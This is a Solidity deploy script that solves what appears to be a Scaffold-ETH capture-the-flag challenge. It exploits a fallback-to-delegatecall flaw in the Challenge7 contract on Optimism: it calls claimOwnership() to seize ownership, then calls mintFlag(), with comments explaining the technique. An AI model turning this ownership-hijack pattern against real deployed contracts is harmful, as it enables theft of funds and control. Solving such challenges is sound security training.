// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./DeployHelpers.s.sol";
import {Challenge7} from "../contracts/Challenge7.sol";
//import {Challenge7Solution} from "../contracts/Challenge7Solution.sol";

/**
 * @notice Deploy script for Challenge7Solution contract
 * @dev Inherits ScaffoldETHDeploy which:
 *      - Includes forge-std/Script.sol for deployment
 *      - Includes ScaffoldEthDeployerRunner modifier
 *      - Provides `deployer` variable
 * Example:
 * yarn deploy --file DeploySolution7.s.sol  # local anvil chain
 * yarn deploy --file DeploySolution7.s.sol --network optimism # live network (requires keystore)
 */
contract DeploySolution7 is ScaffoldETHDeploy {
    /**
     * @dev Deployer setup based on `ETH_KEYSTORE_ACCOUNT` in `.env`:
     *      - "scaffold-eth-default": Uses Anvil's account #9 (0xa0Ee7A142d267C1f36714E4a8F75612F20a79720), no password prompt
     *      - "scaffold-eth-custom": requires password used while creating keystore
     *
     * Note: Must use ScaffoldEthDeployerRunner modifier to:
     *      - Setup correct `deployer` account and fund it
     *      - Export contract addresses & ABIs to nextjs & scripts packages
     */
    function run() external ScaffoldEthDeployerRunner {
        // deployed @  on OP
       // Challenge7Solution challenge7Solution = new Challenge7Solution(0xC962D4f4E772415475AA46Eed06cb1F2D4010c0A); //Challenge7 contract on OP 0xC962D4f4E772415475AA46Eed06cb1F2D4010c0A
       // No solution contract for this required, we simply deploy this script which calls the Challenge7 contract with the function claimOwnership which does not exist in that contract but instead does in the Delegate contract and due to the fallback function the delegate contract function will be called which give my address (supplied by hardhat) ownership of Challenge 7
        (bool success,) = address(0xC962D4f4E772415475AA46Eed06cb1F2D4010c0A).call(abi.encodeWithSignature("claimOwnership()"));
        require(success, "Delegatecall failed!");
        // with ownership passed to my address minting should succeed
        (bool flagSuccess,) = address(0xC962D4f4E772415475AA46Eed06cb1F2D4010c0A).call(abi.encodeWithSignature("mintFlag()"));
        require(flagSuccess, "Minting failed!");

    }
}


